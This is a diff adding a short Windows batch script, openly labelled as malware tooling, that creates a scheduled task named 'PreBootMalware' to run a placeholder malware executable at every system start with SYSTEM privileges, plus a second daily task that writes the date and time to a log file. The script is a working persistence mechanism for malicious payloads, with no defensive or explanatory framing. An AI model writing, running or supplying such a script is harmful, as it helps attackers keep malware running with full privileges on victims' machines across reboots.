@@ -1,0 +1,15 @@
+@echo off
+
+REM Define the malware payload path
+set payload="C:\path\to\your\malware.exe"
+
+REM Define the file where information will be stored
+set logfile="C:\path\to\info.txt"
+
+REM Create a scheduled task to run the payload before user login
+schtasks /create /tn "PreBootMalware" /tr "%payload%" /sc onstart /ru System /f
+
+REM Create a scheduled task to log information to a file
+schtasks /create /tn "LogInfo" /tr "echo %date% %time% >> %logfile%" /sc daily /ru System /f
+
+echo Scheduled tasks created successfully.
